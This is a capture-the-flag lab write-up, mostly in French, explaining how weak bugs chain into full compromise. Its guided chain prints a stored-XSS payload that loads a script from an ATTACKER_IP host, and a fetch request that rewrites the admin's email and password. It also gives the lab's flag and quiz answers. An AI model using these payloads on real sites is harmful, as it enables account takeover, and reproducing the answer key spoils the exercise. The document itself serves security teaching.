# TryHackMe — Chaining Vulnerabilities Writeup

## Task 1 — Introduction

La **vulnérabilité chaining** désigne le fait qu’un ou plusieurs bugs « faibles » pris isolément peuvent devenir critiques lorsqu’ils sont combinés. Les attaquants pensent ainsi de manière cumulative : plusieurs failles de faible ou moyenne gravité peuvent être enchaînées pour atteindre un objectif majeur (ex. contournement d’authentification puis exécution de code).  

Cette room montre comment adopter une vision holistique de l’application — repérer des petits points d’appui, comprendre quelles failles se complètent, et construire une chaîne d’attaque du premier accès jusqu’à la compromission complète.

**Objectifs clés :**
- Penser comme un attaquant et considérer les faibles findings comme des escalons.  
- Reconnaître les chaînes courantes de vulnérabilités.  
- Identifier les frontières faibles entre composants.  
- Suivre une chaîne complète menant d’un accès initial à une exécution distante de code.

---

## Task 2 — Chaining Vulnerabilities (Résumé)

**Qu’est-ce que le vulnerability chaining ?**  
Le vulnerability chaining consiste à combiner deux vulnérabilités (ou plus) qui, prises isolément, sont peu dangereuses, mais qui, une fois enchaînées, permettent d’obtenir un impact majeur (ex : accès, élévation de privilèges, exfiltration).

**Exemples & logique :**
- Une **Self-XSS** seule est limitée. Associée à l’absence de **CSRF**, on peut forcer un admin authentifié à sauvegarder le payload et ainsi obtenir XSS sur sa session — passage de « faible » à « critique ».  
- **Capital One (2019)** : SSRF → accès metadata AWS → récupération d’identifiants → accès S3. Chaine complète = breach.  
- Un **SQLi** protégé par login peut devenir exploitable si l’énumération d’utilisateurs + bruteforce de mots de passe sont possibles.

**Pourquoi c’est important :**  
- Les correctifs isolés (patch-par-patch) peuvent laisser l’architecture vulnérable si on ne considère pas les interactions entre failles.  
- La défense doit être **holistique** : penser en scénarios d’attaque, pas seulement en vulnérabilités isolées.

---

## Task 3 — Methodology: Think Like an Attacker

Processus répétable pour construire des chaînes d’attaque :

1. **Parcourir l’application comme un utilisateur normal** — comprendre flux, rôles, pages sensibles.  
2. **Enumérer et lister les faiblesses** — noter tout (XSS, CSRF, IDOR, erreurs verbeuses, uploads permissifs).  
3. **Analyser ce que chaque finding permet isolément** — quel est le potentiel de l’issue si rien d’autre n’est cassé ?  
4. **Définir l’objectif d’un attaquant** — vol de données, admin takeover, RCE, persistence.  
5. **Assembler une chaîne logique** — relier les failles en un chemin exploitable (ex. enum → brute force → login → stored XSS → cookie theft → admin).  
6. **Tester et valider chaque maillon** — exécuter la chaîne pas à pas, corriger la méthode si un maillon échoue.  
7. **Rédiger le rapport en racontant la chaîne** — expliquer l’enchaînement et l’impact global, pas seulement les bugs isolés.

> Astuce : documente commandes, URLs, réponses serveur et captures d’écran pour prouver chaque étape.

---

## Task 4 — Guided Chain (Walkthrough résumé)

Ce task décrit une chaîne d'attaque complète construite à partir de failles de faible/moyenne gravité.

**Étapes clés :**

1. **Developer test credentials**  
   - Compte laissé par le dev : `testuser:password123`. Connexion initiale avec droits basiques.

2. **Stored XSS dans le profil utilisateur**  
   - Le champ *display name* n’est pas assaini : un payload `<script>...</script>` s’exécute quand le profil est consulté.

3. **CSRF via XSS — changer les identifiants admin**  
   - L’application n’a pas de tokens CSRF. En injectant `<script src="http://ATTACKER_IP:8000/script.js"></script>` (servi par un simple `python3 -m http.server 8000`), l’admin qui visite le profil charge et exécute le script de l’attaquant.  
   - Le script envoie une requête POST same-origin pour modifier l’email et le mot de passe de l’admin (`fetch('/update_email.php', { method: 'POST', credentials: 'include', body: 'email=pwnedadmin@evil.local&password=pwnedadmin' })`).

4. **Login en tant qu’admin**  
   - Connexion avec `admin:pwnedadmin` et accès complet aux fonctionnalités d’administration.

**Pourquoi la chaîne a fonctionné :**  
- Comptes de test actifs, input non assaini, absence de protection CSRF et confiance excessive dans l’authentification.

**Questions / Réponses :**

- **Q : What is the flag in the admin panel?**  
  **A :** `THM{57648b8e-3382-47bb-abbc-f125e128f8ab}`

- **Q : What vulnerability enabled the attacker to force a change in the admin user's password?**  
  **A :** `Cross-site Scripting`

---

## Task 5 — Alternate Paths

Les chaînes d’exploitation ne suivent pas toujours une ligne droite. Si la voie principale bloque (ex. CSRF protégé), un attaquant créatif cherche des **pivots** alternatifs :  
- voler un cookie via XSS,  
- forcer une requête GET qui fuit des données,  
- profiler le navigateur / plugins de l’admin,  
- utiliser une autre faille découverte (SQLi, brute force, IDOR).

**Conseil pratique :** cartographie plusieurs chemins (chemin principal + fallback) et teste chaque maillon avant d’abandonner.  

**Red Team vs Bug Bounty** :  
- **Red Team** : viser l’impact réel (pivot, latéral move, persistance) en restant discret.  
- **Bug Bounty** : démontrer clairement le risque (preuve reproductible), souvent sans aller jusqu’à l’exploitation complète.

---

## Conclusion

This walkthrough shows how seemingly low-risk issues can combine into a full compromise. A default password, a stored XSS and a missing CSRF token may each look minor alone, but chained together they let an attacker move from a low-privileged account to full admin control.  

The main lesson is to think holistically: vulnerability chaining is about context, observation and creativity — spotting what each finding *enables* next. In professional testing, reports should highlight these chains (not just individual bugs) so defenders can fix the root causes and truly reduce risk.  

**Next steps:** apply this mindset in other rooms — map multiple attack paths, test fallbacks, and document the full chain (commands, server responses, screenshots) to produce high-quality, actionable reports.
